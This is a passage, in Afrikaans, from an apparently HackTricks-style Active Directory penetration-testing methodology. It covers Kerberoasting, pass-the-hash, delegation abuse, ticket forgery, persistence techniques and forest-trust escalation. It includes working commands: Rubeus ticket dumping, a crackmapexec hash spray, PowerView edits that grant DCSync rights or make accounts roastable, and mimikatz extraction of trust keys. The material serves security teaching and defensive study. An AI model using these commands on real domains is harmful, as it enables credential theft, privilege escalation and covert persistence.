’n Rekenaar-prinsipaal kan ook uitgaande beheer oor ander rekenaarobjekte of groepe hê. Nadat jy een verkry het, ondersoek sy geneste lidmaatskappe en effektiewe ACL’s afsonderlik: ’n skryftoestemming op ’n ander rekenaarobjek kan ’n rekeningverandering moontlik maak, en groeplidmaatskapregte kan tot ’n aanmeldrol lei. ’n Vlag vir ’n gefaseerde rekening, ’n voorspelbare naamgewingkonvensie of ’n `GenericWrite`-skakel bewys op sigself nie die volledige roete nie.

’n Leesbare kopie van ’n `msDS-ManagedPassword`-blob in ’n lêer, deel of rugsteun is ’n afsonderlike blootstellingsroete: die LDAP-lees-ACL kan nie ’n kopie beskerm wat elders gestoor is nie. Bevestig dat die data ’n bestuurde-wagwoord-blob is voordat jy dit interpreteer, en onderskei dit van sowel ’n gemagtigde LDAP-lees as KDS-hoofsleutelafleiding.

### Kerberoast

Kerberoasting behels die verkryging van **TGS-kaartjies** wat deur dienste gebruik word wat aan gebruikerrekeninge gekoppel is, en die kraak van hul enkripsie—wat op gebruikerwagwoorde gebaseer is—**vanlyn**.

Meer hieroor:


{{#ref}}
kerberoast.md
{{#endref}}

### Afgeleë verbinding (RDP, SSH, FTP, Win-RM, ens.)

Sodra jy sommige geloofsbriewe verkry het, kan jy nagaan of jy toegang tot enige **masjien** het. Jy kan **CrackMapExec** hiervoor gebruik om met verskillende protokolle aan verskeie bedieners te probeer koppel, volgens jou poortskanderings.

### Plaaslike voorregte-eskalasie

As jy geloofsbriewe of ’n sessie as ’n gewone domeingebruiker gekompromitteer het en toegang tot **enige masjien in die domein** het, soek ’n roete om **voorregte plaaslik te eskaleer en geloofsbriewe te versamel**. Plaaslike administrateurvoorregte kan jou toelaat om **ander gebruikers se hashes** uit geheue (LSASS) en plaaslike berging (SAM) te dump.

Hierdie boek bevat ’n volledige bladsy oor [**plaaslike voorregte-eskalasie in Windows**](../windows-local-privilege-escalation/index.html) en ’n [**kontrolelys**](../checklist-windows-privilege-escalation.md). Moet ook nie vergeet om [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) te gebruik nie.

### Huidige sessiekaartjies

Dit is baie **onwaarskynlik** dat jy **kaartjies** in die huidige gebruiker se sessie sal vind wat jou **toestemming gee om toegang tot** onverwagte hulpbronne te kry, maar jy kan nagaan:

```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### NTLM Relay

Met domeinbewyse of ’n gebruikersessie, kyk weer na NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack): geverifieerde enumerasie- en coercion-tegnieke kan relay-roetes blootlê wat tydens verkenning sonder verifikasie nie beskikbaar was nie.

### Soek na Creds in Computer Shares | SMB Shares

Noudat jy ’n paar basiese credentials het, moet jy kyk of jy enige **interessante lêers wat binne die AD gedeel word, kan vind**. Jy kan dit handmatig doen, maar dit is ’n baie vervelige, herhalende taak (veral as jy honderde dokumente vind wat jy moet nagaan).

[**Volg hierdie skakel om meer te wete te kom oor tools wat jy kan gebruik.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steel NTLM Creds

As jy **toegang tot ander PCs of shares** het, kan jy **lêers plaas** (soos ’n SCF-lêer) wat, indien iemand dit op een of ander manier toegang, ’n NTLM-verifikasie teen jou sal t**rigger**, sodat jy die **NTLM challenge** kan **steel** om dit te kraak:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Hierdie kwesbaarheid het enige geverifieerde gebruiker toegelaat om die **domeinbeheerder te kompromitteer**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation op Active Directory MET bevoorregte credentials/sessie

**Vir die volgende tegnieke is ’n gewone domeingebruiker nie genoeg nie; jy het spesiale regte/credentials nodig om hierdie attacks uit te voer.**

### Hash extraction

Hopelik het jy daarin geslaag om ’n **plaaslike admin**-rekening te **kompromitteer** met [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), insluitend relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [plaaslike privilege escalation](../windows-local-privilege-escalation/index.html).\
Dan is dit tyd om al die hashes in die geheue en plaaslik te dump.\
[**Lees hierdie bladsy oor verskillende maniere om die hashes te verkry.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Sodra jy die hash van ’n gebruiker het**, kan jy dit gebruik om die gebruiker **na te boots**.\
Jy moet ’n **tool** gebruik wat NTLM-verifikasie met daardie **hash uitvoer**, **of** jy kan ’n nuwe **sessionlogon** skep en daardie **hash** in die **LSASS** **inject**, sodat daardie **hash gebruik word wanneer enige NTLM-verifikasie uitgevoer word.** Dit is die laaste opsie wat mimikatz gebruik.\
[**Lees hierdie bladsy vir meer inligting.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Hierdie attack het ten doel om **die gebruiker se NTLM-hash te gebruik om Kerberos-tickets aan te vra**, as ’n alternatief vir die algemene Pass The Hash oor die NTLM-protokol. Daarom kan dit veral **nuttig wees in netwerke waar die NTLM-protokol gedeaktiveer is** en slegs **Kerberos as verifikasieprotokol toegelaat word**.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In die **Pass The Ticket (PTT)**-aanvalsmetode **steel attackers ’n gebruiker se verifikasieticket** in plaas van hul wagwoord of hash-waardes. Hierdie gesteelde ticket word dan gebruik om **die gebruiker na te boots**, en sodoende ongemagtigde toegang tot hulpbronne en dienste binne ’n netwerk te verkry.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Hergebruik van Credentials

As jy die **hash** of **wagwoord** van ’n **plaaslike administrato**r het, moet jy probeer om daarmee **plaaslik aan te meld** by ander **PCs**.

```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

> [!WARNING]
> Let daarop dat dit nogal **noisy** is en dat **LAPS** dit sou **mitigate**.

### MSSQL Abuse & Trusted Links

As ’n gebruiker voorregte het om toegang tot **MSSQL-instances** te verkry, kan hy dit moontlik gebruik om **opdragte** op die MSSQL-gasheer uit te voer (as dit as SA loop), die NetNTLM-**hash** te **steel** of selfs ’n **relay attack** uit te voer.\
As ’n MSSQL-instance deur ’n ander instance via ’n databasisskakel vertrou word, kan ’n gebruiker met voorregte oor die gekoppelde databasis moontlik die **vertrouensverhouding gebruik om navrae op die ander instance uit te voer**. Hierdie vertrouensverhoudings kan geketting word en kan uiteindelik by ’n verkeerd gekonfigureerde databasis uitkom waar die gebruiker opdragte kan uitvoer.\
**Die skakels tussen databasisse werk selfs oor forest-trusts heen.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT-bate-/ontplooiingsplatforms se misbruik

Derdeparty-inventaris- en ontplooiingsuites stel dikwels kragtige paaie na geloofsbriewe en kode-uitvoering bloot. Sien:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

As jy enige Computer-objek vind met die kenmerk [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) en jy domeinvoorregte op die rekenaar het, sal jy TGT’s uit die geheue kan dump van elke gebruiker wat by die rekenaar aanmeld.\
Dus, as ’n **Domain Admin by die rekenaar aanmeld**, sal jy sy TGT kan dump en hom met [Pass the Ticket](pass-the-ticket.md) kan naboots.\
Danksy constrained delegation kan jy selfs **outomaties ’n Print Server kompromitteer** (hopelik sal dit ’n DC wees).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

As ’n gebruiker of rekenaar vir "Constrained Delegation" toegelaat word, sal dit enige gebruiker kan **naboots om toegang tot sekere dienste op ’n rekenaar te verkry**.\
As jy dan die **hash van hierdie gebruiker/rekenaar kompromitteer**, sal jy enige gebruiker (selfs domeinadministrateurs) kan **naboots om toegang tot sekere dienste te verkry**.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

As jy **WRITE**-voorregte op ’n Active Directory-objek van ’n afgeleë rekenaar het, kan jy kode-uitvoering met **verhoogde voorregte** verkry:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Die gekompromitteerde gebruiker kan sekere **interessante voorregte oor sommige domeinobjekte** hê wat jou kan help om lateraal te **beweeg**/**voorregte te eskaleer**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Misbruik van die Printer Spooler-diens

As jy ’n **Spool-diens ontdek wat binne die domein luister**, kan dit **misbruik** word om **nuwe geloofsbriewe te bekom** en **voorregte te eskaleer**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Misbruik van derdeparty-sessies

As **ander gebruikers** toegang tot die **gekompromitteerde** masjien verkry, is dit moontlik om **geloofsbriewe uit die geheue in te samel** en selfs **beacons in hul prosesse in te spuit** om hulle na te boots.\
Gebruikers verkry gewoonlik toegang tot die stelsel via RDP; hier is dus hoe om ’n paar attacks op derdeparty-RDP-sessies uit te voer:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** bied ’n stelsel om die **plaaslike Administrator-wagwoord** op domeingekoppelde rekenaars te bestuur en verseker dat dit **gerandomiseer**, uniek en gereeld **verander** word. Hierdie wagwoorde word in Active Directory gestoor en toegang word deur ACLs beperk tot slegs gemagtigde gebruikers. Met voldoende voorregte om toegang tot hierdie wagwoorde te verkry, is dit moontlik om na ander rekenaars oor te skakel.


{{#ref}}
laps.md
{{#endref}}

### Sertifikaatdiefstal

**Die insameling van sertifikate** vanaf die gekompromitteerde masjien kan ’n manier wees om voorregte binne die omgewing te eskaleer:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Misbruik van sertifikaatsjablone

As **kwesbare sjablone** opgestel is, is dit moontlik om hulle te misbruik om voorregte te eskaleer:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Na-uitbuiting met ’n rekening met hoë voorregte

### Dumping van domeingeloofsbriewe

Sodra jy **Domain Admin**- of, nog beter, **Enterprise Admin**-voorregte verkry, kan jy die **domeindatabasis**: _ntds.dit_ **dump**.

[**Meer inligting oor die DCSync-attack is hier beskikbaar**](dcsync.md).

[**Meer inligting oor hoe om die NTDS.dit te steel, is hier beskikbaar**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

’n Leesbare rugsteunargief wat `ntds.dit` saam met die `SYSTEM`-hive bevat, moet as blootgestelde gidsmateriaal beskou word selfs voordat dit uitgepak word. ’n Verouderde wagwoordhash beteken nie dat ander objekkenmerke veilig is nie: velde soos `description` kan geloofsbriewe of operasionele notas bevat. Gaan eers die argief se lede se name na en hou die uitgepakte databasisinhoud buite gewone enumerasie-uitvoer.

### Privesc as Persistence

Sommige van die tegnieke wat vroeër bespreek is, kan vir persistence gebruik word.\
Jy kan byvoorbeeld:

- Gebruikers kwesbaar maak vir [**Kerberoast**](kerberoast.md)

  ```bash
  Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
  ```

- Maak gebruikers kwesbaar vir [**ASREPRoast**](asreproast.md)

  ```bash
  Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
  ```

- Ken [**DCSync**](#dcsync)-voorregte aan 'n gebruiker toe.

  ```bash
  Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
  ```

### Silver Ticket

Die **Silver Ticket-aanval** skep ’n **geldige Ticket Granting Service (TGS)-kaartjie** vir ’n spesifieke diens deur die **NTLM-hash** te gebruik (byvoorbeeld die **hash van die rekenaarrekening**). Hierdie metode word gebruik om **toegang tot die diens se voorregte** te verkry.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

’n **Golden Ticket-aanval** behels dat ’n aanvaller toegang verkry tot die **NTLM-hash van die krbtgt-rekening** in ’n Active Directory (AD)-omgewing. Hierdie rekening is spesiaal omdat dit gebruik word om alle **Ticket Granting Tickets (TGT’s)** te onderteken, wat noodsaaklik is vir verifikasie binne die AD-netwerk.

Sodra die aanvaller hierdie hash bekom, kan hulle **TGT’s** skep vir enige rekening wat hulle kies (Silver Ticket-aanval).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Dit is soortgelyk aan Golden Tickets, maar word op ’n manier vervals wat **algemene opsporingsmeganismes vir Golden Tickets omseil.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Sertifikaatrekening-volharding**

**Om sertifikate van ’n rekening te hê of dit te kan aanvra** is ’n baie goeie manier om toegang tot ’n gebruiker se rekening te behou (selfs al verander die gebruiker die wagwoord):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Sertifikaatdomein-volharding**

**Dit is ook moontlik om sertifikate te gebruik om hoë voorregte binne die domein te behou:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder-groep

Die **AdminSDHolder**-objek in Active Directory verseker die sekuriteit van **bevoorregte groepe** (soos Domain Admins en Enterprise Admins) deur ’n standaard-**Access Control List (ACL)** op hierdie groepe toe te pas om ongemagtigde veranderinge te voorkom. Hierdie funksie kan egter uitgebuit word; as ’n aanvaller die AdminSDHolder se ACL verander om ’n gewone gebruiker volle toegang te gee, verkry daardie gebruiker uitgebreide beheer oor alle bevoorregte groepe. Hierdie sekuriteitsmaatreël, wat bedoel is om te beskerm, kan dus die teenoorgestelde uitwerking hê en ongemagtigde toegang moontlik maak tensy dit noukeurig gemonitor word.

[**Meer inligting oor die AdminDSHolder-groep hier.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM-geloofsbriewe

Daar is ’n **plaaslike administrateur**-rekening op elke **Domain Controller (DC)**. As jy adminregte op so ’n masjien verkry, kan die plaaslike Administrator-hash met **mimikatz** onttrek word. Daarna is ’n registerverandering nodig om **die gebruik van hierdie wagwoord te aktiveer**, wat afstandtoegang tot die plaaslike Administrator-rekening moontlik maak.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL-volharding

Jy kan ’n **gebruiker** **spesiale toestemmings** oor spesifieke domeinobjekte **gee**, sodat die gebruiker **in die toekoms voorregte kan eskaleer**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Sekuriteitsbeskrywers

Die **sekuriteitsbeskrywers** word gebruik om die **toestemmings** wat ’n **objek** **oor** ’n **objek** het, te **stoor**. As jy net ’n **klein verandering** aan ’n objek se **sekuriteitsbeskrywer** kan **maak**, kan jy baie interessante voorregte oor daardie objek verkry sonder om lid van ’n bevoorregte groep te wees.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dinamiese objek-antiforensika / ontduiking

Misbruik die `dynamicObject`-hulpklas om kortstondige principals/GPO’s/DNS-rekords met `entryTTL`/`msDS-Entry-Time-To-Die` te skep; hulle vee hulself uit sonder tombstones, en wis LDAP-bewyse uit terwyl weeskind-SID’s, gebroke `gPLink`-verwysings of DNS-kasreaksies agterbly (bv. AdminSDHolder-ACE-besoedeling of kwaadwillige `gPCFileSysPath`-/AD-geïntegreerde DNS-herleidings).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Verander **LSASS** in die geheue om ’n **universele wagwoord** te vestig, wat toegang tot alle domeinrekeninge verleen.


{{#ref}}
skeleton-key.md
{{#endref}}

### Pasgemaakte SSP

[Lees hier wat ’n SSP (Security Support Provider) is.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Jy kan jou **eie SSP** skep om die **geloofsbriewe** wat gebruik word om toegang tot die masjien te verkry, in **duidelike teks** vas te lê.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Dit registreer ’n **nuwe Domain Controller** in die AD en gebruik dit om **eienskappe** (SIDHistory, SPN’s...) op gespesifiseerde objekte te **stoot**, **sonder** om enige **logboeke** oor die **veranderinge** agter te laat. Jy **het DA**-voorregte nodig en moet binne die **worteldomein** wees.\
Let daarop dat as jy verkeerde data gebruik, baie lelike logboeke sal verskyn.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS-volharding

Ons het voorheen bespreek hoe om voorregte te eskaleer as jy **genoeg toestemmings het om LAPS-wagwoorde te lees**. Hierdie wagwoorde kan egter ook gebruik word om **volharding te handhaaf**.\
Kyk:


{{#ref}}
laps.md
{{#endref}}

## Forest-voorregte-eskalasie - domeintrustverhoudings

Microsoft beskou die **Forest** as die sekuriteitsgrens. Dit beteken dat **die kompromittering van ’n enkele domein moontlik daartoe kan lei dat die hele Forest gekompromitteer word**.<sup>[[1]](#references)</sup>

### Basiese inligting

’n [**domeintrustverhouding**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) is ’n sekuriteitsmeganisme wat ’n gebruiker van een **domein** toegang tot hulpbronne in ’n ander **domein** gee. Dit skep in wese ’n koppeling tussen die verifikasiestelsels van die twee domeine, sodat verifikasiekontroles naatloos kan plaasvind. Wanneer domeine ’n trustverhouding instel, ruil hulle spesifieke **sleutels** binne hul **Domain Controllers (DC’s)** uit en behou hulle dit daar; hierdie sleutels is noodsaaklik vir die integriteit van die trustverhouding.

In ’n tipiese scenario moet ’n gebruiker wat toegang tot ’n diens in ’n **vertroude domein** wil verkry, eers ’n spesiale kaartjie, bekend as ’n **inter-realm TGT**, van hul eie domein se DC aanvra. Hierdie TGT word geënkripteer met ’n gedeelde **sleutel** waaroor albei domeine ooreengekom het. Die gebruiker bied dan hierdie TGT aan die **DC van die vertroude domein** om ’n dienskaartjie (**TGS**) te kry. Nadat die DC van die vertroude domein die inter-realm TGT suksesvol bekragtig het, reik dit ’n TGS uit wat die gebruiker toegang tot die diens gee.

**Stappe**:

1. ’n **Kliëntrekenaar** in **Domein 1** begin die proses deur sy **NTLM-hash** te gebruik om ’n **Ticket Granting Ticket (TGT)** van sy **Domain Controller (DC1)** aan te vra.
2. DC1 reik ’n nuwe TGT uit as die kliënt suksesvol geverifieer is.
3. Die kliënt vra dan ’n **inter-realm TGT** van DC1 aan, wat nodig is om toegang tot hulpbronne in **Domein 2** te verkry.
4. Die inter-realm TGT word geënkripteer met ’n **trust-sleutel** wat DC1 en DC2 as deel van die tweerigting-domeintrustverhouding deel.
5. Die kliënt neem die inter-realm TGT na **Domein 2 se Domain Controller (DC2)**.
6. DC2 verifieer die inter-realm TGT met die gedeelde trust-sleutel en reik, indien dit geldig is, ’n **Ticket Granting Service (TGS)** uit vir die bediener in Domein 2 waartoe die kliënt toegang wil verkry.
7. Laastens bied die kliënt hierdie TGS aan die bediener, wat met die bediener se rekeninghash geënkripteer is, om toegang tot die diens in Domein 2 te verkry.

### Verskillende trustverhoudings

Dit is belangrik om daarop te let dat **’n trustverhouding eenrigting of tweerigting kan wees**. In ’n tweerigtingverhouding vertrou albei domeine mekaar, maar in ’n **eenrigting**-trustverhouding is een domein die **vertroude** domein en die ander die **vertrouende** domein. In laasgenoemde geval **sal jy slegs toegang tot hulpbronne binne die vertrouende domein vanaf die vertroude domein kan verkry**.

As Domein A Domein B vertrou, is A die vertrouende domein en B die vertroude een. Boonop is dit in **Domein A** ’n **uitgaande trustverhouding**; en in **Domein B** ’n **inkomende trustverhouding**.

**Verskillende vertrouingsverhoudings**

- **Ouer-kind-trustverhoudings**: Dit is ’n algemene opstelling binne dieselfde forest, waar ’n kinderdomein outomaties ’n tweerigting-transitiewe trustverhouding met sy ouerdomein het. Dit beteken in wese dat verifikasieversoeke naatloos tussen die ouer- en kinderdomein kan vloei.
- **Dwarskakel-trustverhoudings**: Daar word hierna verwys as “kortpad-trustverhoudings”, en hulle word tussen kinderdomeine ingestel om verwysingsprosesse te bespoedig. In komplekse forests moet verifikasieverwysings gewoonlik tot by die forest-wortel en dan af na die teikendomein beweeg. Deur dwarskakels te skep, word die roete verkort, wat veral nuttig is in geografies verspreide omgewings.
- **Eksterne trustverhoudings**: Dit word tussen verskillende, onverwante domeine ingestel en is van nature nie-transitief. Volgens [Microsoft se dokumentasie](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) is eksterne trustverhoudings nuttig om toegang te verkry tot hulpbronne in ’n domein buite die huidige forest wat nie deur ’n forest-trustverhouding verbind is nie. SID-filtrering versterk die sekuriteit van eksterne trustverhoudings.
- **Wortelboom-trustverhoudings**: Hierdie trustverhoudings word outomaties tussen die forest-worteldomein en ’n nuutbygevoegde boomwortel ingestel. Hoewel hulle nie algemeen voorkom nie, is boomwortel-trustverhoudings belangrik om nuwe domeinbome by ’n forest te voeg. Dit stel hulle in staat om ’n unieke domeinnaam te behou en verseker tweerigting-transitiwiteit. Meer inligting is beskikbaar in [Microsoft se gids](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest-trustverhoudings**: Hierdie tipe trustverhouding is ’n tweerigting-transitiewe trustverhouding tussen twee forest-worteldomeine, en dwing ook SID-filtrering af om sekuriteitsmaatreëls te versterk.
- **MIT-trustverhoudings**: Hierdie trustverhoudings word ingestel met nie-Windows-[RFC4120-voldoenende](https://tools.ietf.org/html/rfc4120) Kerberos-domeine. MIT-trustverhoudings is ietwat gespesialiseerd en is bedoel vir omgewings wat integrasie met Kerberos-gebaseerde stelsels buite die Windows-ekosisteem vereis.

#### Ander verskille in **vertrouingsverhoudings**

- ’n Trustverhouding kan ook **transitief** wees (A vertrou B, B vertrou C, dus vertrou A vir C) of **nie-transitief**.
- ’n Trustverhouding kan as ’n **tweerigting-trustverhouding** (albei vertrou mekaar) of ’n **eenrigting-trustverhouding** (slegs een vertrou die ander) ingestel word.

### Aanvalsroete

1. **Enumereer** die vertrouingsverhoudings.
2. Kyk of enige **sekuriteitsprinsipaal** (gebruiker/groep/rekenaar) **toegang** tot hulpbronne van die **ander domein** het, moontlik deur ACE-inskrywings of omdat dit in groepe van die ander domein is. Soek **verhoudings tussen domeine** (dit is waarskynlik waarvoor die trustverhouding geskep is).
   1. In hierdie geval kan kerberoast nog ’n opsie wees.
3. **Kompromitteer** die **rekeninge** wat tussen domeine kan **beweeg**.

Aanvallers kan deur drie primêre meganismes toegang tot hulpbronne in ’n ander domein verkry:

- **Lidmaatskap van plaaslike groepe**: Prinsipale kan by plaaslike groepe op masjiene gevoeg word, soos die “Administrators”-groep op ’n bediener, wat hulle aansienlike beheer oor daardie masjien gee.
- **Lidmaatskap van groepe in ’n eksterne domein**: Prinsipale kan ook lede wees van groepe binne die eksterne domein. Die doeltreffendheid van hierdie metode hang egter af van die aard van die trustverhouding en die omvang van die groep.
- **Toegangsbeheerlyste (ACL’s)**: Prinsipale kan in ’n **ACL** gespesifiseer word, veral as entiteite in **ACE’s** binne ’n **DACL**, wat hulle toegang tot spesifieke hulpbronne gee. Vir diegene wat die werking van ACL’s, DACL’s en ACE’s verder wil ondersoek, is die witskrif met die titel “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” ’n onskatbare bron.<sup>[[17]](#references)</sup>

### Vind eksterne gebruikers/groepe met toestemmings

Jy kan **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** nagaan om eksterne sekuriteitsprinsipale in die domein te vind. Dit sal gebruikers/groepe van **’n eksterne domein/forest** wees.

Jy kan dit in **Bloodhound** nagaan of powerview gebruik:

```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```

### Voorregte-eskalasie van kind na ouer in ’n forest

```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```

Ander maniere om domeintrusts te enumereer:

```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```

> [!WARNING]
> Daar is **2 vertroude sleutels**, een vir _Child --> Parent_ en 'n ander een vir _Parent_ --> _Child_.\
> Jy kan die een wat deur die huidige domein gebruik word, met die volgende nagaan:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Eskaleer as Enterprise admin na die child/parent-domein deur die trust met SID-History injection te misbruik:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Ontgin skryfbare Configuration NC

Dit is noodsaaklik om te verstaan hoe die Configuration Naming Context (NC) uitgebuit kan word. Die Configuration NC dien as ’n sentrale bewaarplek vir konfigurasiedata regdeur ’n forest in Active Directory (AD)-omgewings. Hierdie data word na elke Domain Controller (DC) binne die forest gerepliseer, met skryfbare DC's wat ’n skryfbare kopie van die Configuration NC onderhou. Om dit uit te buit, moet ’n mens **SYSTEM-voorregte op ’n DC** hê, verkieslik ’n child DC.

**Koppel GPO aan die root DC-site**

Die Configuration NC se Sites-houer bevat inligting oor die sites van alle domeingekoppelde rekenaars binne die AD-forest. Deur met SYSTEM-voorregte op enige DC te werk, kan aanvallers GPO's aan die root DC-sites koppel. Hierdie aksie kan die root-domein moontlik kompromitteer deur beleide wat op hierdie sites toegepas word, te manipuleer.

Vir diepgaande inligting kan ’n mens navorsing oor [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4) raadpleeg.<sup>[[12]](#references)</sup>

**Kompromitteer enige gMSA in die forest**

Een aanvalvektor behels dat daar op bevoorregte gMSA's binne die domein gemik word. Die KDS Root key, wat noodsaaklik is om gMSA-wagwoorde te bereken, word binne die Configuration NC gestoor. Met SYSTEM-voorregte op enige DC is dit moontlik om toegang tot die KDS Root key te kry en die wagwoorde vir enige gMSA regoor die forest te bereken.

’n Gedetailleerde ontleding en stap-vir-stap leiding is beskikbaar in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Aanvullende gedelegeerde MSA-aanval (BadSuccessor – misbruik van migrasie-attribuutwaardes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Bykomende eksterne navorsing: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Skemaveranderingsaanval**

Hierdie metode verg geduld terwyl daar gewag word dat nuwe bevoorregte AD-objekte geskep word. Met SYSTEM-voorregte kan ’n aanvaller die AD Schema wysig om enige gebruiker volle beheer oor alle klasse te gee. Dit kan lei tot ongemagtigde toegang tot en beheer oor nuutgeskepte AD-objekte.

Verdere leesstof is beskikbaar oor [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**Van DA na EA met ADCS ESC5**

Die ADCS ESC5-kwesbaarheid teiken beheer oor Public Key Infrastructure (PKI)-objekte om ’n sertifikaatsjabloon te skep wat verifikasie as enige gebruiker binne die forest moontlik maak. Aangesien PKI-objekte in die Configuration NC geleë is, maak die kompromittering van ’n skryfbare child DC die uitvoering van ESC5-aanvalle moontlik.

Meer besonderhede hieroor is beskikbaar in [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> In scenario's sonder ADCS kan die aanvaller die nodige komponente opstel, soos bespreek in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### Eksterne Forest-domein - Eenrigting (inkomend) of tweerigting

```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

In hierdie scenario word **jou domein deur ’n eksterne domein vertrou**, wat jou **onbepaalde toestemmings** daaroor gee. Jy sal moet uitvind **watter principals van jou domein watter toegang tot die eksterne domein het** en dan probeer om dit uit te buit:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Eksterne Forest-domein - Eenrigting (Uitgaand)

```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```

In hierdie scenario vertrou **jou domein** sekere **voorregte** toe aan ’n principal in **’n ander domein**.

